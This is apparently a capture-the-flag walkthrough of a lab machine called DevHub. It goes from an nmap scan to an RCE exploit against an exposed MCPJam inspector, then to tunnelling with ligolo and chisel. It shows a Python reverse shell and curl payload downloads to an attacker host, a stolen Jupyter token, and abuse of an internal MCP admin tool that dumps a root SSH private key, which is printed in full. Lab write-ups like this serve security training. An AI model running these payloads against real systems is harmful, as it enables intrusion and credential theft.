# DevHub

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.4.254

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/devhub_tcp.htb $ip
# 22/tcp   open  ssh
# 80/tcp   open  http
# 6274/tcp open  unknown

# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/devhub_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/devhub_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**we modify the hosts fiile and discover the 80 and 6374 ports**

{% code overflow="wrap" %}
```bash
echo "10.129.4.254 devhub.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1).png" alt="" width="563"><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2).png" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="info" %}
* **MCP Inspector** on port `6274` (Active) – a debugging tool for the Model Context Protocol. This might expose an API or web interface that allows you to test MCP servers, potentially leading to command injection or arbitrary code execution if not properly secured.
* **Analytics Dashboard** on port `8888` (Internal only) – a Jupyter notebook environment. Even if it says "internal only"
* **Code Repository** (Maintenance Mode) – could be a Git web interface like Gitea, GitLab, or just a plain Git server
{% endhint %}

<mark style="color:blue;">**Step 3**</mark>

**we have an MCP server** <mark style="color:red;">**"MCPJam Version: v1.4.2"**</mark>

**I found directly a CVE related to this version**&#x20;

{% hint style="danger" %}
**MCPJam inspector is the local-first development platform for MCP servers. Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. Version 1.4.3 contains a patch.**
{% endhint %}

<mark style="color:blue;">**Step 4**</mark>

**Let's exploit this**

{% code overflow="wrap" %}
```bash
# Using this repo it has the good rates
git clone https://github.com/InzegoSec/CVE-2026-23744.git
cd CVE-2026-23744
pip install -r requirements.txt


python CVE-2026-23744.py --url http://devhub.htb:6274 --lhost 10.10.14.63 --lport 4444

# On other terminal
listener 4444
# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```
{% endcode %}



<mark style="color:blue;">**Step 5**</mark>

**Now let's enumarate to elevate our privs**

{% code overflow="wrap" %}
```bash
netstat -tulpn
# tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
# tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
# tcp6       0      0 :::22                   :::*                    LISTEN      -
```
{% endcode %}

**Then i use ligolo and set up a routing to 240.0.0.1/32 to forward all ports directly**

{% code overflow="wrap" %}
```bash
# On kali
serv 8000

# on target 
curl -s -o agent http://10.10.14.63:8000/agent
chmod +x agent

# On kali
./proxy -selfcert -laddr 0.0.0.0:11601

# on target
nohup ./agent -connect 10.10.14.63:11601 -ignore-cert > /dev/null 2>&1 &

# on ligolo proxy
interface_create --name "ligolo"
interface_add_route --name ligolo --route 240.0.0.1/32

```
{% endcode %}

<figure><img src=".gitbook/assets/image (3).png" alt="" width="524"><figcaption></figcaption></figure>

**We need to find the token for jupyter**

<mark style="color:blue;">**Step 6**</mark>

{% code overflow="wrap" %}
```bash
ps aux | grep jupyter
# analyst     1045  0.0  2.4 183068 97308 ?        Ss   19:09   0:07 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```
{% endcode %}

**I found that the CSRF protection is strict over the Ligolo tunnel so the injection doesnt work so we will work internally**

**So we will do another port forwarding with chisel**

{% code overflow="wrap" %}
```bash
# on kali
./chisel server --port 8080 --reverse

# On target
nohup ./chisel client 10.10.14.63:8080 R:8888:localhost:8888 > /dev/null 2>&1 &
```
{% endcode %}

<figure><img src=".gitbook/assets/image (4).png" alt="" width="563"><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 7**</mark>

**we use the token we found to login**

**after login we use a jupyter notebook to execute commands and it works**

{% code overflow="wrap" %}
```python
import os;
os.system('whoami')

#analyst
#0
```
{% endcode %}

&#x20;**Now we will try to catch a reverse shell over analyst**

{% code overflow="wrap" %}
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.63",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])

# analyst@devhub:~/notebooks$ id
# uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>

**Let's read the server.py then we take the apikey to run commands on port 5000**

{% code overflow="wrap" %}
```wasm
curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'  # we already have the key
  
  cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key

# SSH to localhost as root
ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@127.0.0.1

id
uid=0(root) gid=0(root) groups=0(root)
```
{% endcode %}

